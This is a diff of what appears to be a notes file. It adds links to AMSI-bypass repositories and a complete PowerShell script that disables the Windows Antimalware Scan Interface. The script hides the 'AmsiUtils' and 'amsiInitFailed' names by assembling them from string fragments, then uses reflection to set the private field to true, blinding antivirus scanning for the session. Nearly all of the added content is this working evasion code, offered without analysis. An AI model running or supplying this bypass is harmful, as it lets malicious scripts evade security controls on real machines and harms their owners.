@@ -8,3 +8,29 @@ https://github.com/ASP4RUX/Invoke-AMSI/blob/main/Invoke-ASAMSI.ps1
 
 
 https://github.com/ASP4RUX/AMSI-Patch
+
+
+
+$x = 'si'
+$c = 'Am'
+
+Write-Output "Building type name..."
+$TypeName = ('System.Management.Automation.{0}{1}Utils' -f $c, $x)
+Write-Output "Type Name: $TypeName"
+
+Write-Output "Getting reference to the type..."
+$Ref = [Ref].Assembly.GetType($TypeName)
+Write-Output "Reference acquired: $Ref"
+
+Write-Output "Getting the field name..."
+$FieldName = ('am{0}InitFailed' -f $x)
+Write-Output "Field Name: $FieldName"
+
+Write-Output "Fetching the field..."
+$z = $Ref.GetField($FieldName, 'NonPublic,Static')
+Write-Output "Field Reference: $z"
+
+Write-Output "Setting field value to true..."
+$z.("Set" + "Value")($null, $true)
+
+Write-Output "AMSI Bypass executed successfully!"
